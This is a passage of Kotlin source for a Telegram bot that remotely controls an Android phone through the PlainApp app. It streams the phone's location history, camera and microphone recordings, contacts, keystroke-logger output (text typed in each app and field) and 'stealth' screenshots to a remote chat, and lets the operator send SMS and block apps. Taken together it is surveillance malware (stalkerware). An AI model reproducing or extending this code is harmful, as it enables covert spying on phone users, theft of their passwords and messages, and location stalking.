        val file = recordVideo(MainApp.instance, seconds, useFront)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendVideo(token, chatId, file, "🎬 Video · ${seconds}s · ${if (useFront) "front" else "back"} camera · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Video recording failed. Ensure Camera & Microphone permissions are granted.")
        }
    }

    private suspend fun consumePendingInput(action: String, text: String) {
        val parts = action.split(":")
        when (parts[0]) {
            "audio_duration" -> {
                val n = text.trim().toIntOrNull()
                if (n == null || n !in 1..300) {
                    sendMessage("❌ Invalid duration. Send a number between 1 and 300, e.g. <code>45</code>.\nSend /audio to start over.")
                    return
                }
                runAudioRecording(n)
            }
            "video_duration" -> {
                val cam = parts.getOrNull(1) ?: "back"
                val n = text.trim().toIntOrNull()
                if (n == null || n !in 1..120) {
                    sendMessage("❌ Invalid duration. Send a number between 1 and 120, e.g. <code>45</code>.\nSend /video to start over.")
                    return
                }
                runVideoRecording(n, useFront = cam == "front")
            }
            "sms_to" -> {
                val tok = parts.getOrNull(1) ?: return
                val num = phoneFromToken(tok)
                if (num.isNullOrBlank()) {
                    sendMessage("⚠️ Number expired. Open the contact again and tap 💬 SMS.")
                    return
                }
                val body = text.trim()
                if (body.isEmpty()) {
                    sendMessage("❌ Empty message — nothing was sent.")
                    return
                }
                try {
                    SmsHelper.sendText(num, body)
                    sendMessage("✅ SMS sent to <code>${htmlEsc(num)}</code>:\n<i>${htmlEsc(body)}</i>")
                } catch (e: Exception) {
                    sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
                }
            }
            "note_create" -> {
                val raw = text.trim()
                if (raw.isEmpty()) { sendMessage("❌ Empty note — nothing saved."); return }
                val (title, body) = if (raw.contains('\n')) {
                    val nl = raw.indexOf('\n')
                    raw.substring(0, nl).trim() to raw.substring(nl + 1).trim()
                } else {
                    val short = raw.take(60)
                    short to raw
                }
                try {
                    val n = NoteHelper.addOrUpdateAsync("") {
                        this.title = title
                        this.content = body
                    }
                    sendMessage("✅ <b>Note saved</b>\n📝 <b>${htmlEsc(title)}</b>\n<i>id: <code>${n.id.take(8)}</code></i>")
                } catch (e: Exception) {
                    sendMessage("❌ Could not save note: ${htmlEsc(e.message ?: "")}")
                }
            }
            "bookmark_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a full URL starting with http:// or https://")
                    return
                }
                try {
                    val list = BookmarkHelper.addBookmarks(listOf(url))
                    val b = list.firstOrNull()
                    if (b != null) {
                        sendMessage("✅ <b>Bookmark added</b>\n🔗 <code>${htmlEsc(url)}</code>\n<i>id: ${b.id.take(8)}</i>\n\n<i>Title/favicon will fetch in background.</i>")
                        scope.launch {
                            try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {}
                        }
                    } else {
                        sendMessage("✅ Bookmark recorded.")
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
                }
            }
            "feed_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a full RSS/Atom URL starting with http:// or https://")
                    return
                }
                try {
                    val existing = FeedHelper.getByUrl(url)
                    if (existing != null) { sendMessage("ℹ️ That feed is already added: <b>${htmlEsc(existing.name)}</b>"); return }
                    val channel = FeedHelper.fetchAsync(url)
                    val name = channel.title?.takeIf { it.isNotBlank() } ?: url
                    val id = FeedHelper.addAsync {
                        this.url = url
                        this.name = name
                    }
                    sendMessage("✅ <b>Feed added</b>\n📡 <b>${htmlEsc(name)}</b>\n<i>id: ${id.take(8)}</i>\n\n<i>Send /feeds to see all feeds.</i>")
                } catch (e: Exception) {
                    sendMessage("❌ Could not add feed: ${htmlEsc(e.message ?: "")}")
                }
            }
            "speak_text" -> {
                val say = text.trim()
                if (say.isEmpty()) { sendMessage("❌ Nothing to speak."); return }
                UtilitiesHelper.speak(say)
                sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
            }
            "show_text" -> {
                val msg = text.trim()
                if (msg.isEmpty()) { sendMessage("❌ Nothing to show."); return }
                if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
                    sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
                    return
                }
                MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
                sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
            }
            else -> { /* ignore */ }
        }
    }

    private suspend fun renderContactDetail(rawId: String, editMessageId: Long?) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) {
                val msg = "❌ Contact not found (id $rawId)."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val display = contactDisplayName(c)
            val sb = StringBuilder()
            sb.append("👤 <b>${htmlEsc(display)}</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            val org = c.organization
            if (org != null && (org.company.isNotBlank() || org.title.isNotBlank())) {
                val parts = listOfNotNull(
                    org.company.takeIf { it.isNotBlank() },
                    org.title.takeIf { it.isNotBlank() },
                ).joinToString(" · ")
                sb.append("🏢 ${htmlEsc(parts)}\n")
            }
            if (c.nickname.isNotBlank()) sb.append("🏷 <i>${htmlEsc(c.nickname)}</i>\n")
            if (org != null || c.nickname.isNotBlank()) sb.append("\n")

            if (c.phoneNumbers.isNotEmpty()) {
                sb.append("<b>📞 Phone numbers</b>\n")
                c.phoneNumbers.forEach { ph ->
                    val label = phoneTypeLabel(ph.type, ph.label)
                    val labelTxt = if (label.isNotBlank()) "  · $label" else ""
                    sb.append("   • <code>${htmlEsc(ph.value)}</code>$labelTxt\n")
                }
                sb.append("\n")
            }
            if (c.emails.isNotEmpty()) {
                sb.append("<b>📧 Email</b>\n")
                c.emails.forEach { sb.append("   • <code>${htmlEsc(it.value)}</code>\n") }
                sb.append("\n")
            }
            if (c.addresses.isNotEmpty()) {
                sb.append("<b>📍 Address</b>\n")
                c.addresses.forEach { sb.append("   • ${htmlEsc(it.value)}\n") }
                sb.append("\n")
            }
            if (c.websites.isNotEmpty()) {
                sb.append("<b>🔗 Website</b>\n")
                c.websites.forEach { sb.append("   • ${htmlEsc(it.value)}\n") }
                sb.append("\n")
            }
            if (c.notes.isNotBlank()) {
                sb.append("<b>📝 Note</b>\n   ${htmlEsc(c.notes.take(500))}\n\n")
            }

            // Action keyboard: per-phone Call + SMS rows, then Share + Back.
            val rows = mutableListOf<List<Pair<String, String>>>()
            c.phoneNumbers.take(5).forEach { ph ->
                val tok = phoneToken(ph.value)
                val short = ph.value.take(18)
                rows.add(listOf(
                    "📞 Call $short" to "c_call:$tok",
                    "💬 SMS $short" to "c_sms:$tok",
                ))
            }
            if (c.phoneNumbers.isNotEmpty()) {
                rows.add(listOf("📤 Share contact card" to "c_share:$rawId"))
            }
            rows.add(listOf("⬅️ Back to list" to "c_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load contact: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun phoneTypeLabel(type: Int, customLabel: String): String {
        if (customLabel.isNotBlank()) return customLabel
        return when (type) {
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
            else -> ""
        }
    }

    private suspend fun cbShareContact(rawId: String) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) { sendMessage("❌ Contact not found."); return }
            val phone = c.phoneNumbers.firstOrNull()?.value
            if (phone.isNullOrBlank()) { sendMessage("❌ This contact has no phone number to share."); return }
            val first = c.givenName.ifBlank { contactDisplayName(c) }
            val last = c.familyName.ifBlank { null }
            val vcard = buildVCard(c)
            val ok = TelegramApiClient.sendContact(token, chatId, phone, first, last, vcard)
            if (!ok) sendMessage("❌ Telegram refused the contact card.")
        } catch (e: Exception) {
            sendMessage("❌ Could not share contact: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun buildVCard(c: com.ismartcoding.plain.data.DContact): String {
        val sb = StringBuilder()
        sb.append("BEGIN:VCARD\r\nVERSION:3.0\r\n")
        val display = contactDisplayName(c)
        sb.append("FN:$display\r\n")
        sb.append("N:${c.familyName};${c.givenName};${c.middleName};${c.prefix};${c.suffix}\r\n")
        if (c.nickname.isNotBlank()) sb.append("NICKNAME:${c.nickname}\r\n")
        c.organization?.let { o ->
            if (o.company.isNotBlank()) sb.append("ORG:${o.company}\r\n")
            if (o.title.isNotBlank()) sb.append("TITLE:${o.title}\r\n")
        }
        c.phoneNumbers.forEach { sb.append("TEL:${it.value}\r\n") }
        c.emails.forEach { sb.append("EMAIL:${it.value}\r\n") }
        c.addresses.forEach { sb.append("ADR:;;${it.value};;;;\r\n") }
        c.websites.forEach { sb.append("URL:${it.value}\r\n") }
        if (c.notes.isNotBlank()) sb.append("NOTE:${c.notes.replace("\n", "\\n")}\r\n")
        sb.append("END:VCARD\r\n")
        return sb.toString()
    }

    /** Robust display name for a contact: structured name → nickname → organization → first phone → "(no name)". */
    private fun contactDisplayName(c: com.ismartcoding.plain.data.DContact): String {
        val full = c.fullName().trim()
        if (full.isNotEmpty()) return full
        if (c.nickname.isNotBlank()) return c.nickname
        val org = c.organization
        if (org != null && org.company.isNotBlank()) return org.company
        val phone = c.phoneNumbers.firstOrNull()?.value?.trim().orEmpty()
        if (phone.isNotEmpty()) return phone
        return "(no name)"
    }

    private suspend fun cmdApps(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        try {
            val apps = PackageHelper.searchAsync(query, 40, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC)
            if (apps.isEmpty()) { sendMessage("📱 No apps found."); return }
            val sb = StringBuilder("📱 <b>Installed Apps</b> (${apps.size})\n\n")
            apps.forEachIndexed { i, a ->
                val blocked = if (AppBlockHelper.isBlocked(a.id)) " 🚫" else ""
                sb.append("${i + 1}. <b>${htmlEsc(a.name)}</b>$blocked\n")
                sb.append("   <code>${htmlEsc(a.id)}</code>  v${htmlEsc(a.version)}\n\n")
                if (sb.length > 3600) { sb.append("…and more. Use /apps <name> to search."); return@forEachIndexed }
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdBlockApp(args: List<String>) {
        if (args.isNotEmpty()) {
            val pkg = args[0]
            AppBlockHelper.setBlocked(pkg, true)
            sendMessage("🚫 <b>${htmlEsc(pkg)}</b> is now blocked.\n\nUse /unblockapp $pkg to unblock.")
            return
        }
        renderAppPickerForBlock(query = "", offset = 0, editMessageId = null)
    }

    private suspend fun cmdUnblockApp(args: List<String>) {
        if (args.isNotEmpty()) {
            val pkg = args[0]
            AppBlockHelper.setBlocked(pkg, false)
            sendMessage("✅ <b>${htmlEsc(pkg)}</b> is now unblocked.")
            return
        }
        renderUnblockPicker(editMessageId = null)
    }

    private fun cmdBlockedApps() {
        scope.launch { renderUnblockPicker(editMessageId = null) }
    }

    /** Show installed apps with inline buttons; tapping opens the per-app block menu. */
    private suspend fun renderAppPickerForBlock(query: String, offset: Int, editMessageId: Long?) {
        sendTyping()
        try {
            val pageSize = 12
            val apps = PackageHelper.searchAsync(
                if (query.isEmpty()) "" else "text:$query",
                pageSize + 1, offset,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC
            )
            val hasMore = apps.size > pageSize
            val pageItems = apps.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = "📱 No apps found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val title = "🚫 <b>Block an app</b>\n<i>Tap an app to choose a block option.</i>\n" +
                "Showing ${offset + 1}–${offset + pageItems.size}\n\n"
            val sb = StringBuilder(title)
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val blockedTag = if (AppBlockHelper.isBlocked(a.id)) " 🚫" else ""
                sb.append("${offset + i + 1}. <b>${htmlEsc(a.name)}</b>$blockedTag\n   <code>${htmlEsc(a.id)}</code>\n")
                rows.add(listOf("${a.name.take(28)}$blockedTag" to "block_pick:${a.id.take(50)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "block_list:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "block_list:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    /** After tapping an app, show the block-action menu (instant or timed). */
    private suspend fun renderBlockActionMenu(pkg: String, editMessageId: Long) {
        val name = try {
            PackageHelper.searchAsync("ids:$pkg", 1, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC).firstOrNull()?.name ?: pkg
        } catch (_: Exception) { pkg }
        val text = buildString {
            append("📱 <b>${htmlEsc(name)}</b>\n<code>${htmlEsc(pkg)}</code>\n\n")
            append("Choose a block option:")
        }
        val rows = listOf(
            listOf("🚫 Block now (always)" to "block_now:${pkg.take(50)}"),
            listOf(
                "⏱ 30 min today" to "block_lim:${pkg.take(45)}:30",
                "⏱ 1 h today" to "block_lim:${pkg.take(45)}:60",
            ),
            listOf(
                "⏱ 2 h today" to "block_lim:${pkg.take(45)}:120",
                "⏱ 4 h today" to "block_lim:${pkg.take(45)}:240",
            ),
            listOf("◀️ Back" to "block_list:0"),
        )
        TelegramApiClient.editMessageText(
            token, chatId, editMessageId, text,
            replyMarkup = TelegramApiClient.inlineKeyboard(rows)
        )
    }

    /** Show currently blocked apps as inline keyboard; tapping unblocks. */
    private suspend fun renderUnblockPicker(editMessageId: Long?) {
        val blocked = AppBlockHelper.getBlockedSet().toList()
        val limits = AppBlockHelper.getTimeLimits()
        if (blocked.isEmpty() && limits.isEmpty()) {
            val msg = "✅ No apps are currently blocked or limited."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        // Resolve nice names
        val ids = (blocked + limits.keys).distinct()
        val nameMap = try {
            PackageHelper.searchAsync("ids:${ids.joinToString(",")}", ids.size, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC)
                .associate { it.id to it.name }
        } catch (_: Exception) { emptyMap() }

        val sb = StringBuilder("📵 <b>Blocked & limited apps</b>\n<i>Tap to unblock / clear limit.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        blocked.forEachIndexed { i, pkg ->
            val nm = nameMap[pkg] ?: pkg
            sb.append("${i + 1}. 🚫 <b>${htmlEsc(nm)}</b>\n   <code>${htmlEsc(pkg)}</code>\n\n")
            rows.add(listOf("✅ Unblock ${nm.take(28)}" to "unblock:${pkg.take(55)}"))
        }
        limits.entries.forEachIndexed { i, (pkg, dailyMs) ->
            val nm = nameMap[pkg] ?: pkg
            val mins = dailyMs / 60000
            sb.append("${blocked.size + i + 1}. ⏱ <b>${htmlEsc(nm)}</b> · ${mins} min/day\n   <code>${htmlEsc(pkg)}</code>\n\n")
            rows.add(listOf("✕ Clear limit ${nm.take(24)}" to "limit_clr:${pkg.take(50)}"))
        }
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    @SuppressLint("MissingPermission")
    private fun cmdLocation() {
        sendMessage("📍 Getting location…")
        try {
            val lm = MainApp.instance.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val providers = listOf(
                android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER
            )
            var loc: android.location.Location? = null
            for (p in providers) {
                if (lm.isProviderEnabled(p)) {
                    loc = lm.getLastKnownLocation(p)
                    if (loc != null) break
                }
            }
            if (loc == null) {
                sendMessage("❌ Location not available. Ensure Location permission & GPS are enabled.")
                return
            }
            val age = (System.currentTimeMillis() - loc.time) / 1000
            TelegramApiClient.sendLocation(token, chatId, loc.latitude, loc.longitude)
            sendMessage("📍 <b>Location</b>\n" +
                "🌐 Lat: <code>${loc.latitude}</code>\n" +
                "🌐 Lon: <code>${loc.longitude}</code>\n" +
                "🎯 Accuracy: ±${loc.accuracy.toInt()}m\n" +
                "🕐 Age: ${age}s ago")
        } catch (e: Exception) {
            sendMessage("❌ Location error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdBattery() {
        val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
        if (bat == null) { sendMessage("❌ Battery info unavailable."); return }
        val plugState = when (bat.plugged) {
            1 -> "⚡ AC charging"
            2 -> "⚡ USB charging"
            4 -> "⚡ Wireless charging"
            else -> "🔌 Unplugged"
        }
        val statusLabel = when (bat.status) {
            android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            android.os.BatteryManager.BATTERY_STATUS_FULL -> "Full"
            android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not charging"
            else -> "Unknown"
        }
        val level = bat.level
        val bar = buildString {
            val filled = (level / 10)
            append("[")
            repeat(filled) { append("█") }
            repeat(10 - filled) { append("░") }
            append("]")
        }
        sendMessage("🔋 <b>Battery Status</b>\n\n" +
            "$bar <b>$level%</b>\n" +
            "🔌 $plugState\n" +
            "📊 Status: $statusLabel\n" +
            "🌡 Temp: ${bat.temperatureC}°C\n" +
            "⚡ Voltage: ${bat.voltageMv}mV\n" +
            "🕐 Checked: ${ts}")
    }

    private fun cmdDevice() {
        val ctx = MainApp.instance
        val name = PhoneHelper.getDeviceName(ctx)
        val batPct = PhoneHelper.getBatteryPercentage(ctx)
        val sb = StringBuilder("📲 <b>Device Information</b>\n\n")
        sb.append("📱 <b>Name:</b> ${htmlEsc(name)}\n")
        sb.append("🏭 <b>Brand:</b> ${htmlEsc(Build.BRAND)}\n")
        sb.append("🔧 <b>Model:</b> ${htmlEsc(Build.MODEL)}\n")
        sb.append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
        sb.append("🆔 <b>Build:</b> ${htmlEsc(Build.DISPLAY.take(40))}\n")
        sb.append("🔋 <b>Battery:</b> $batPct%\n")
        sb.append("🕐 <b>Time:</b> ${ts}\n")
        val call = LiveCallTracker.snapshot()
        if (call.state != "idle") {
            sb.append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
        }
        sendMessage(sb.toString())
    }

    // ========== TRACKING HUB ==========

    private fun cmdTrackHub() {
        val ctx = MainApp.instance
        val locOn = LocationTrackingHelper.isEnabled(ctx)
        val locCount = LocationTrackingHelper.countPoints(ctx)
        val locLatest = LocationTrackingHelper.latestPoint(ctx)
        val locInterval = LocationTrackingHelper.getIntervalSec(ctx)
        val keyOn = KeystrokeLogHelper.isEnabled(ctx)
        val keyCount = KeystrokeLogHelper.count(ctx = ctx)
        val keyLimit = KeystrokeLogHelper.getBufferLimit(ctx)
        val shotOn = StealthScreenshotHelper.isEnabled(ctx)
        val shotCount = StealthScreenshotHelper.count(ctx)
        val shotInterval = StealthScreenshotHelper.getIntervalMin(ctx)

        val sb = StringBuilder()
        sb.append("🛰 <b>Tracking Hub</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n\n")
        sb.append("🗺 <b>Live Location</b>  ${if (locOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📍 ${locCount} points · every ${locInterval}s\n")
        if (locLatest != null) {
            val age = (System.currentTimeMillis() - locLatest.ts) / 1000
            sb.append("   🕐 Last fix: ${age}s ago · ±${locLatest.accuracy.toInt()}m\n")
        }
        sb.append("   ➡️ /livelocation  /tracklocation\n\n")

        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (keyOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📝 ${keyCount} entries · buffer ${keyLimit}\n")
        sb.append("   ➡️ /keystrokes  /keytop\n\n")

        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (shotOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📸 ${shotCount} captures · every ${shotInterval} min\n")
        sb.append("   ➡️ /shots  /screenshot\n\n")

        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🕐 ${ts}")
        sendMessage(sb.toString())
    }

    private fun cmdLiveLocation(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 5
        val state = LocationTrackingHelper.isEnabled(ctx)
        val total = LocationTrackingHelper.countPoints(ctx)
        val interval = LocationTrackingHelper.getIntervalSec(ctx)
        val minDisp = LocationTrackingHelper.getMinDisplacement(ctx)
        val latest = LocationTrackingHelper.latestPoint(ctx)
        val recent = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)

        val sb = StringBuilder()
        sb.append("🗺 <b>Live Location</b>  ${if (state) "🟢 STREAMING" else "⚪ STOPPED"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📊 Total points: <b>${total}</b>\n")
        sb.append("⏱ Sample every: <b>${interval}s</b> · min move <b>${minDisp}m</b>\n\n")

        if (latest != null) {
            val age = (System.currentTimeMillis() - latest.ts) / 1000
            sb.append("📍 <b>Latest fix</b>\n")
            sb.append("   🌐 <code>${latest.lat}, ${latest.lng}</code>\n")
            sb.append("   🎯 ±${latest.accuracy.toInt()}m · ${latest.provider}\n")
            sb.append("   🚀 Speed: ${"%.1f".format(latest.speed * 3.6)} km/h\n")
            sb.append("   🔋 Battery: ${latest.batteryLevel}%${if (latest.charging) " ⚡" else ""}\n")
            sb.append("   🕐 ${age}s ago · ${fmtTime(latest.ts)}\n\n")
            try { TelegramApiClient.sendLocation(token, chatId, latest.lat, latest.lng) } catch (_: Throwable) {}
        } else {
            sb.append("(no location samples yet)\n\n")
        }

        if (recent.size > 1) {
            sb.append("🧭 <b>Recent ${recent.size} points</b>\n")
            recent.forEachIndexed { i, p ->
                val ago = (System.currentTimeMillis() - p.ts) / 1000
                sb.append("${i + 1}. <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>  ±${p.accuracy.toInt()}m  · ${ago}s ago\n")
            }
            sb.append("\nUse /tracklocation N for more.")
        }
        sendMessage(sb.toString())
    }

    private fun cmdTrackLocation(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 100) ?: 20
        val pts = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)
        if (pts.isEmpty()) { sendMessage("📍 No location points recorded yet.\n\nEnable Live Location from PlainApp → Tracking Hub."); return }
        val sb = StringBuilder("🧭 <b>Last ${pts.size} location points</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
        pts.forEachIndexed { i, p ->
            sb.append("${i + 1}. <b>${fmtTime(p.ts)}</b>\n")
            sb.append("   🌐 <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>\n")
            sb.append("   🎯 ±${p.accuracy.toInt()}m · 🚀 ${"%.1f".format(p.speed * 3.6)} km/h · 🔋 ${p.batteryLevel}%\n\n")
            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    private fun cmdKeystrokes(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 15
        val on = KeystrokeLogHelper.isEnabled(ctx)
        val total = KeystrokeLogHelper.count(ctx = ctx)
        val limit = KeystrokeLogHelper.getBufferLimit(ctx)
        val entries = KeystrokeLogHelper.list(offset = 0, limit = n, ctx = ctx)

        val sb = StringBuilder()
        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📝 Total: <b>${total}</b> · buffer <b>${limit}</b>\n\n")
        if (entries.isEmpty()) {
            sb.append("(no entries captured yet)")
        } else {
            sb.append("📋 <b>Last ${entries.size} entries</b>\n\n")
            entries.forEachIndexed { i, e ->
                val app = if (e.appLabel.isNotBlank()) e.appLabel else e.packageName
                val field = if (e.fieldHint.isNotBlank()) " · <i>${htmlEsc(e.fieldHint)}</i>" else ""
                sb.append("${i + 1}. 📱 <b>${htmlEsc(app)}</b>$field\n")
                sb.append("   🕐 ${fmtTime(e.ts)}\n")
                sb.append("   <code>${htmlEsc(e.text.take(160))}</code>\n\n")
                if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
            }
        }
        sendMessage(sb.toString())
    }

    private fun cmdKeyTop() {
        val ctx = MainApp.instance
        val stats = KeystrokeLogHelper.packageBreakdown(ctx)
        if (stats.isEmpty()) { sendMessage("📊 No keystroke data yet."); return }
        val sb = StringBuilder("📊 <b>Top apps by keystrokes</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
        val total = stats.sumOf { it.second }
        stats.take(15).forEachIndexed { i, (pkg, count) ->
            val pct = if (total > 0) (count * 100 / total) else 0
            val bar = "█".repeat((pct / 5).coerceAtMost(20)) + "░".repeat((20 - pct / 5).coerceAtLeast(0))
            sb.append("${i + 1}. <code>${htmlEsc(pkg)}</code>\n")
            sb.append("   $bar ${count} (${pct}%)\n\n")
        }
        sendMessage(sb.toString())
    }

    private suspend fun cmdShots(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 30) ?: 10
        val on = StealthScreenshotHelper.isEnabled(ctx)
        val total = StealthScreenshotHelper.count(ctx)
        val list = StealthScreenshotHelper.list(0, n, ctx)

        val sb = StringBuilder()
        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📸 Total: <b>${total}</b>\n\n")
        if (list.isEmpty()) {
            sb.append("(no screenshots captured yet)\n\nUse /screenshot for an instant capture.")
            sendMessage(sb.toString())
            return
        }
        sb.append("📋 <b>Last ${list.size} captures</b>\n\n")
        list.forEachIndexed { i, s ->
            sb.append("${i + 1}. 🕐 <b>${fmtTime(s.ts)}</b>")
            if (s.manual) sb.append(" · 👆 manual")
            sb.append("\n   📐 ${s.width}×${s.height} · 💾 ${s.sizeBytes / 1024} KB\n")
            if (s.packageName.isNotBlank()) sb.append("   📱 <code>${htmlEsc(s.packageName)}</code>\n")
            sb.append("\n")
        }
        sendMessage(sb.toString())

        val latest = list.firstOrNull()
        if (latest != null) {
            val f = File(latest.absPath)
            if (f.exists()) {
                sendUploadPhoto()
                try { TelegramApiClient.sendPhoto(token, chatId, f, "🖼 Latest stealth shot · ${fmtTime(latest.ts)}") } catch (_: Throwable) {}
            }
        }
    }

    // ========== PERMISSIONS ==========

    private fun cmdPermissions() {
        val ctx = MainApp.instance
        val all = Permission.entries.filter { it != Permission.NONE }
        val granted = mutableListOf<Permission>()
        val denied = mutableListOf<Permission>()
        all.forEach {
            val ok = try { it.can(ctx) } catch (_: Throwable) { false }
            if (ok) granted.add(it) else denied.add(it)
        }
        val pct = if (all.isNotEmpty()) granted.size * 100 / all.size else 0
        val barFilled = (pct / 5).coerceIn(0, 20)
        val bar = "█".repeat(barFilled) + "░".repeat(20 - barFilled)

        fun group(p: Permission): String = when {
            p.name.contains("SMS") -> "📨 Messaging"
            p.name.contains("CONTACT") -> "👥 Contacts"
            p.name.contains("CALL") || p.name == "READ_PHONE_STATE" || p.name == "READ_PHONE_NUMBERS" -> "📞 Phone"
            p.name.contains("LOCATION") -> "📍 Location"
            p.name == "CAMERA" || p.name.startsWith("READ_MEDIA") || p.name == "WRITE_EXTERNAL_STORAGE" -> "🖼 Media & storage"
            p.name.contains("BLUETOOTH") -> "📡 Connectivity"
            p.name == "RECORD_AUDIO" -> "🎙 Audio"
            p.name == "POST_NOTIFICATIONS" || p.name == "NOTIFICATION_LISTENER" -> "🔔 Notifications"
            else -> "⚙️ System"
        }

        val sb = StringBuilder()
        sb.append("🛡 <b>App Permissions</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("$bar  <b>${pct}%</b>\n")
        sb.append("✅ Granted: <b>${granted.size}</b>  ·  ❌ Denied: <b>${denied.size}</b>  ·  Total ${all.size}\n\n")

